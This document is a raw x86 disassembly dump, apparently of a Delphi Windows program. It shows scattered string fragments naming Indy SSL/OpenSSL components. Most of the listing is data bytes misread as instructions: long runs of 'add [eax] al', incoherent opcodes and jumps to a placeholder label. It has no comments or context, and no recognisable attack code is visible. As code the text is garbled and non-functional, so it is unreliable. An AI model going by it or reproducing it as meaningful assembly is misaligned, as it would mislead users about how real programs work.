lodsb [ esi ]
cmc
inc ebp
add [ eax + eax ] cl
outsd
jb r-xdata
push j_sub_403834#9
push [ fs : eax ]
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc0045f7 ]
outsd
jb r-xdata
jns r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 8 + 0x45 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
test [ ebp ] 0xc
add [ eax ] al
add [ eax ] al
inc ebp
test [ ebp ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] al
call 0x1b463575
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
cmc
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi [ ebx + 0x34 ]
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4248f8
xor eax eax
push ebp
push sub_45f876
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_403eb4
mov ebx [ ebp + 0x14 ]
mov esi [ ebx + 0x34 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
cwde
clc
inc ebp
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
jb r-xdata
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x12463771
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ecx
test [ ebp ] 0x0
add [ eax ] al
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x194636a5
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
push ebx
je r-xdata
jb r-xdata
inc eax
imul ebp [ esi + 0x67 ] 0x68706943
jb r-xdata
mov eax [ ebp - 0x8 ]
call sub_404174
mov ebx eax
lea eax [ ebp - 0xc ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_4041c0
mov eax [ ebp - 0xc ]
call sub_404374
mov edx eax
lea ecx [ ebx + 0x1 ]
mov eax [ ebp + 0x8 ]
call sub_408434
mov [ ebp - 0x4 ] ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f87d
mov eax [ rw-data ]
call sub_424900
retn
inc esp
popad
je r-xdata
add [ eax ] al
add [ edx + esi * 8 + 0x33280045 ] ah
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x134637d1
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x72 ] si
jb r-xdata
mov al [ 0x45f7 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0045f7 ] ah
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
or bh bh
push ecx
mov esi [ fs : ebx + 0x34 ]
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
xor eax eax
push ebp
xor [ eax ] al
call 0x1746370d
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
add [ eax - 0x53ffbfd0 ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
test [ ebp ] 0xc
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
outsd
jb r-xdata
popad
imul ebp [ fs : esi + 0x67 ] 0x4579654b
rcr ah 0xf6
inc ebp
add [ eax ] al
add [ eax ] al
sub_45ea98
push ebx
push ebx
dec esp
push esi
jb r-xdata
push ebx
je r-xdata
jns r-xdata
0xc08b0045 0xeb18
nop
push ebx
push ebx
dec esp
nop
clc
0x13060045 0x4954
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xa0045ea ] dl
jae r-xdata
add [ eax ] eax
insb
jbe r-xdata
add [ ebx + 0x45ebf4c0 ] cl
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x40109400
add ecx [ ebp + 0x73 ]
push es
push ebx
je r-xdata
push ax
jb r-xdata
jb r-xdata
imul ebp [ edi + 0x6e ] 0x45ec4473
add [ edi ] al
or eax 0x53644954
push ebx
dec esp
dec edi
jo r-xdata
add [ eax ] al
add [ eax ] al
inc ebp
ja r-xdata
adc [ ebx + 0x73 ] dh
insb
jbe r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65560a00
jb r-xdata
inc esi
imul ebp [ ebp + 0x4 ] 0xc00406d
add [ eax ] al
dec [ eax + eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4b070002 ] al
imul ebp [ edi + 0x6e ] 0x45ebf473
add ah bh
push ss
inc ecx
add [ ecx ] cl
add [ ecx + ecx * 2 ] cl
push ebx
push ebx
dec esp
dec edi
jo r-xdata
inc esp
in al dx
jb r-xdata
outsb
inc bx
insb
imul esp [ ebp + 0x6e ] 0x636e4f74
or al 0x49
push ebx
push ebx
dec esp
dec edi
jo r-xdata
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
push eax
popad
jae r-xdata
outsb
add [ si + 0x4010 ] dl
insb
jbe r-xdata
or [ eax ] al
or al [ ebx + 0x69 ]
jo r-xdata
jns r-xdata
add [ eax ] bl
imul ebp [ ebp - 0x20 ] 0x100045e9
add [ eax ] al
call [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d060003 ] al
je r-xdata
pop es
add [ eax ] al
add [ edx ] 0x0
outsb
push ebx
push ebx
dec esp
or [ eax ] eax
add al 0x6d
inc eax
add [ eax + eax ] al
add bh bh
add al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
or al 0x52
outsd
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
inc ebp
jbe r-xdata
add [ ecx ] eax
or [ eax + 0x61 ] dl
jae r-xdata
push eax
popad
outsb
add [ eax + edx + 0x40900040 ] dl
jmp r-xdata
inc si
popad
imul ebp [ ecx + ecx * 2 + 0x66 ] 0x65506f4e
jb r-xdata
adc [ eax ] al
or al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb al 0x0
jb r-xdata
jae r-xdata
outsd
cmp al 0x10
inc eax
add [ eax + eax ] dl
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ ebx ] cl
push esi
jb r-xdata
jo r-xdata
outsd
cmp dl ch
inc ebp
add [ ecx ] dl
add [ eax ] al
call [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d040004 ] al
dec ebx
add [ edi ] al
jb r-xdata
add [ eax ] al
in al dx
inc ebp
add [ esp + ebp * 8 + 0x45 ] al
je r-xdata
outsb
add [ eax + eax ] ah
add [ eax ] al
mov [ esi ] dl
ja r-xdata
jb r-xdata
jmp r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x11 ] bh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 + 0x45 ] bl
js r-xdata
inc eax
add [ ebx + eax ] al
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ 0xffffffff94000000 ] al
adc [ eax ] al
or [ eax ] al
add [ eax ] al
xchg esp eax
imul esi [ ebx + 0x74 ] 0xfc00408d
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560a0005 ] al
jb r-xdata
adc [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] al
mov al [ 0x28004010 ]
push r-xdata
sbb al 0x0
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ edx ] cl
push esi
jb r-xdata
outsd
hlt
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x4d
inc esi
imul ebp [ ebp + 0x4 ] 0x800406d
add [ eax ] al
dec [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43080001 ] al
jb r-xdata
in al dx
jb r-xdata
inc ecx
add [ eax + eax * 2 ] ch
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ 0x4000000 ] al
insd
inc eax
add [ eax + eax ] al
add [ eax ] al
add al 0x6d
inc eax
add [ eax ] cl
add [ eax ] al
add [ ebp * 2 + 0xc0040 ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
and [ eax ] al
add [ eax ] al
or eax 0x53644954
push ebx
dec esp
dec edi
jo r-xdata
imul esp [ esi + 0x69 ] 0x65746163
pop es
push esp
dec ecx
pop eax
xor eax 0x42073930
outsd
outsd
insb
popad
outsb
add [ eax ] dl
inc eax
add [ eax ] al
and dl dh
inc ebp
push es
push ebx
je r-xdata
loopne r-xdata
inc ebp
add [ eax ] dl
inc ecx
inc ecx
add [ eax + 0x41 ] dl
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx ] ch
inc ecx
add [ ebx + edx * 8 ] cl
inc ebp
add [ ecx ] bh
inc ecx
add [ edx ] dh
add [ eax + eax - 0x347c0000 ] dh
inc ebp
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
out dx eax
inc ebp
mov dh ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x180045ee ] cl
add [ eax ] al
add [ eax + 0x28004010 ] ah
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
xor [ ecx ] cl
inc esi
add [ esp + edx * 2 ] cl
dec ecx
push ebx
push ebx
dec esp
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc ebx
imul esi [ eax + 0x68 ] 0x694c7265
jae r-xdata
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
add al 0x3
jns r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
imul ebp [ esi + 0x67 ] 0x40109400
add [ ebx + ebp * 8 + 0x45 ] ch
add [ eax ] cl
adc [ esi + edx * 2 + 0x65 ] dl
jb r-xdata
add eax 0x53530a00
dec esp
dec edi
jo r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
or eax 0x53644954
push ebx
dec esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + edx + 0x200040 ] dl
inc eax
add ah ah
out dx al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
and [ eax ] al
add [ eax + eax ] bl
in eax dx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
in eax dx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
cld
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
out dx al
inc ebp
add [ eax ] bh
add [ eax ] al
add [ eax + 0x28004010 ] ah
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
imul esi [ edx + 0x73 ] r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
cmp [ ebx ] dh
inc eax
add [ ebx + esi ] bh
jns r-xdata
jns r-xdata
imul ebp [ edi + 0x6e ] 0x45eb1473
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
inc ecx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ esi + edi * 8 - 0x4d1bffbb ] cl
inc ebp
add [ ebx + esi * 4 ] bl
inc ebp
add [ ebx + esi * 4 + 0x45 ] cl
add [ eax ] bh
add [ esi ] al
sar bh 0x45
add [ edi + edi * 8 ] ch
inc ebp
add [ eax + edx * 8 - 0x17ffbb ] ch
inc ebp
add [ ecx + edx * 8 ] ch
inc ebp
add al dh
inc [ ebp ]
or [ eax ] al
inc esi
add [ edx + eax ] ch
inc esi
add [ ecx + eax + 0x46 ] dl
add [ eax - 0x33ffb9ff ] dh
add [ esi ] eax
and [ eax ] al
inc esi
add [ eax + eax ] ch
inc esi
add al dh
add [ esi ] eax
adc eax 0x53644954
push ebx
dec esp
dec ecx
dec edi
sar [ eax - 0x11 ] 0x45
add [ eax ] al
xor ch ah
jb r-xdata
adc [ ecx + 0x41 ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
je r-xdata
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ edi + ecx * 2 ] cl
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0004 ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0006 ] al
dec [ eax + 0x1ff0000 ]
nop
loopne r-xdata
jae r-xdata
js r-xdata
out dx al
inc ebp
add [ eax - 0x34 ] al
inc ebp
add [ ecx ] cl
add [ ecx + ecx * 2 ] cl
push ebx
push ebx
dec esp
dec edi
jo r-xdata
xor [ eax ] al
add [ eax + 0x41 ] al
add [ eax + 0x180045fb ] bh
inc ecx
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530a0003 ] al
dec edi
dec eax
popad
outsb
insb
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
inc ebp
add [ eax - 0x54000000 ] dl
out 0x45 eax
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
jb r-xdata
outsb
outsw
cmp al 0xeb
inc ebp
add [ eax - 0x6f010000 ] dl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
popad
outsb
insb
jb r-xdata
add [ edi ] al
adc eax 0x53644954
push ebx
dec esp
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
inc ebp
add [ eax ] 0x0
add [ eax + 0x4f0d0007 ] al
outsb
inc edi
je r-xdata
outsb
push ebx
push ebx
dec esp
add al 0x0
inc eax
in al dx
inc ebp
add [ eax + eax ] bh
or [ ebx ] cl
inc ebx
jb r-xdata
add [ eax ] ecx
or eax [ ebx + 0x65 ]
sbb dl dh
inc ebp
jae r-xdata
jns r-xdata
imul ebp [ edi + 0x6e ] 0x45eb1473
add [ eax ] bh
add bh bh
js r-xdata
push ebx
dec esp
dec edi
jo r-xdata
push ebx
push ebx
dec esp
mov eax eax
cld
add [ eax + 0x41 ] dl
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx ] ch
inc ecx
add al bh
lahf
inc ecx
add [ ecx ] bh
inc eax
inc ebp
add [ eax ] dl
inc ecx
inc ecx
inc ecx
add [ edx ] dh
inc ecx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ eax ] dh
cld
inc ebp
add ah ah
mov dl 0x45
add [ ebx + esi * 4 ] bl
inc ebp
add [ ebx + esi * 4 + 0x45 ] cl
add [ eax + 0x700045fc ] bh
std
inc ebp
add al bh
std
inc ebp
add [ esi + edi * 8 + 0x45 ] cl
add [ eax - 0x2 ] ch
inc ebp
add [ 0x53644954 ] dl
jb r-xdata
popad
jae r-xdata
jb r-xdata
outsb
outsw
cmp al 0xeb
inc ebp
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0005 ] al
outsb
inc edi
je r-xdata
test [ esi ] cl
inc esi
add [ edi ] al
push esp
jb r-xdata
outsb
push ebx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
or al 0x4f
add [ eax - 0x4 ] bh
ja r-xdata
xor eax 0xf2143930
inc ebp
add ah dh
adc [ eax ] al
add [ eax ] al
or al 0x49
push ebx
push ebx
dec esp
dec edi
jo r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax + 0x28004010 ] ah
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
inc ebp
popad
jae r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
inc ebp
add [ eax + eax ] cl
add [ eax ] al
adc [ ebx + 0x45 ] ch
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0xf463321
inc ebp
dec ecx
dec edi
jo r-xdata
outsb
push ebx
push ebx
dec esp
add [ eax ] al
mov eax eax
xchg esp eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 + 0x80045 ] dl
add [ eax ] al
mov al [ 0x28004010 ]
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
push eax
cmovbe eax [ eax ]
or al 0x54
dec ecx
push ebx
push ebx
dec esp
inc ebx
imul esi [ eax + 0x68 ] 0x408d7265
add al dh
adc al 0xf2
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
xor [ eax ] al
js r-xdata
jb r-xdata
dec ecx
pop eax
xor eax 0xf2243930
inc ebp
add [ edi ] al
pop es
push esp
dec ecx
pop eax
add ah cl
push cs
inc esi
add [ esi + ecx + 0x54070046 ] al
ja r-xdata
jb r-xdata
outsb
push ebx
push ebx
dec esp
inc ebp
jb r-xdata
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
push 0x980045eb
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0008 ] al
outsb
push esi
xor [ eax ] al
int3
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb ah dh
inc ebp
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
inc ebp
add [ eax + eax ] cl
outsd
jb r-xdata
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
push 0x880045eb
add [ eax ] al
dec [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0006 ] al
outsb
push esi
dec edi
push ebx
push ebx
dec esp
inc edi
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 8 + 0x45 ] cl
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x1346337d
add [ eax ] al
add bl dh
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x1d4633dd
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
outsd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 8 + 0xc0045 ] ch
outsd
je r-xdata
dec esi
dec esi
outsd
je r-xdata
inc ebp
dec ecx
dec edi
jo r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x1b46350d
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
jb r-xdata
je r-xdata
jne r-xdata
sar [ eax - 0xc ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] bh
inc ebp
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x154634a9
inc ebp
dec ecx
outsb
push ebx
push ebx
dec esp
dec esp
outsd
popad
inc ebp
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x11463449
inc ebp
outsd
popad
push ebx
push ebx
dec esp
dec esp
imul esp [ edx + 0x72 ] 0x8b797261
rcr [ eax ] 0xf4
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
hlt
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x746f6f52
inc ebx
popad
je r-xdata
je r-xdata
outsd
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
push edx
outsd
outsd
outsb
inc ebx
outsd
outsb
je r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
cmc
inc ebp
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
test [ ebp ] 0xc
add [ eax ] al
add [ edx + esi * 8 + 0x33280045 ] ah
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
outsd
jb r-xdata
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x16463641
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc dh dh
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add bl dh
inc ebp
outsd
jb r-xdata
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x174635dd
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x74726543
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 8 + 0xc0045 ] ch
inc ebp
jb r-xdata
dec ecx
dec edi
push ebx
push ebx
dec esp
dec ebp
outsd
dec esi
rcr ah 0xf4
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
